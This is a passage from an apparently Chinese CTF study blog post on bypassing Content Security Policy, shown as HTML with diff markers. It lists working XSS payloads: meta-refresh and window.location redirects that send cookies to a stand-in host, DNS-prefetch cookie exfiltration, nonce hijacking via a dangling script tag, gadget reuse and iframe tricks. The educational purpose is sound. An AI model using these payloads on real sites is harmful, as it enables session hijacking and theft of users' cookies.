+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在允许<code>unsafe-inline</code>（允许内联 Js 执行）的情况下，可以用<code>window.location</code>，或者<code>window.open</code>之类的方法进行跳转绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://www.xss.com/x.php?c=[cookie]&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="link标签预加载"><a href="#link标签预加载" class="headerlink" title="link标签预加载"></a><code>link</code>标签预加载</h4><p>在 Firefox 下，可以将 Cookie 作为子域名，用<code>dns 预解析</code>的方式把 Cookie 带出去，查看<code>dns</code>服务器的日志就能得到 Cookie</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//[cookie].xxx.ceye.io&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h4><p>有些网站限制只有某些脚本才能使用，往往会使用 script 标签的 nonce 属性，只有 nonce 一致的脚本才生效</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;none&#x27;;script-src &#x27;nonce-abc&#x27;</span><br><span class="line"></span><br><span class="line">// CSP 设置 nonce 为 abc 属性的标签</span><br></pre></td></tr></table></figure>
+
+<p>那么当脚本插入点为如下的情况时</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;aa&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;abc&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;CSP&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以插入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//14.rs</span> <span class="attr">a</span>=<span class="string">&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这样会拼成一个新的 script 标签，其中的<code>src</code>可以自由设定</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//14.rs</span> <span class="attr">a</span>=<span class="string">&quot;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;script id=&quot;</span><span class="attr">aa</span>&quot; <span class="attr">nonce</span>=<span class="string">&quot;abc&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;CSP&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="代码重用"><a href="#代码重用" class="headerlink" title="代码重用"></a>代码重用</h4><p>假设页面中使用了<code>Jquery-mobile</code>库，并且<code>CSP</code>策略中包含<code>script-src &#39;unsafe-eval&#39;</code>或者<code>script-src &#39;strict-dynamic&#39;</code>，那么下面的向量就可以绕过<code>CSP</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="ifrmae"><a href="#ifrmae" class="headerlink" title="ifrmae"></a><code>ifrmae</code></h4><p>如果页面 A 中有<code>CSP</code>限制，但是页面 B 中没有，同时 A 和 B 同源，那么就可以在 A 页面中包含 B 页面来绕过<code>CSP</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;B&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 Chrome 下，<code>iframe</code>标签支持<code>csp</code>属性，这有时候可以用来绕过一些防御，例如<code>http://xxx</code>页面有个<code>js</code>库会过滤<code>XSS</code>向量，我们就可以使用<code>csp</code>属性来禁掉这个<code>js</code>库</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">csp</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://xxx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a><code>meta</code>标签</h4><p>meta 标签有一些不常用的功能有时候有奇效：meta 可以控制缓存（在 header 没有设置的情况下），有时候可以用来绕过<code>CSP nonce</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;cache-control&quot;</span> <span class="attr">content</span>=<span class="string">&quot;public&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>meta 可以设置 Cookie（Firefox 下），可以结合 self-xss 利用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Set-Cookie&quot;</span> <span class="attr">Content</span>=<span class="string">&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>本文参考链接</p>
+<p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023022332902400">AJAX</a>、<a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/same-origin-policy.html">同源策略</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src">CSP: default-src</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">内容安全策略 ( CSP )</a></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000037408890">「网络」CSP和Nonce</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/19966531">JSONP 的工作原理是什么？</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/21979782">Content Security Policy (CSP) 是什么？为什么它能抵御 XSS 攻击？</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huzhenv5/article/details/104884760">DOM跨域的三种解决方案：document.domain、window.name、window.postMessage</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/JSONP/" rel="tag"># JSONP</a>
+              <a href="/tags/CORS/" rel="tag"># CORS</a>
+              <a href="/tags/WebSocket/" rel="tag"># WebSocket</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/06/23/Linux-%E5%8F%8D%E5%BC%B9-Shell-%E5%B0%8F%E7%BB%93/" rel="prev" title="Linux 反弹 Shell 小结">
+                  <i class="fa fa-angle-left"></i> Linux 反弹 Shell 小结
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/10/22/MoeCTF-2022-Web-Wp/" rel="next" title="MoeCTF 2022 Web Wp">
+                  MoeCTF 2022 Web Wp <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陕ICP备2022001516号 </a>
+  </div>
+  <div class="copyright">
+    &copy; 2022 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Paoka1</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
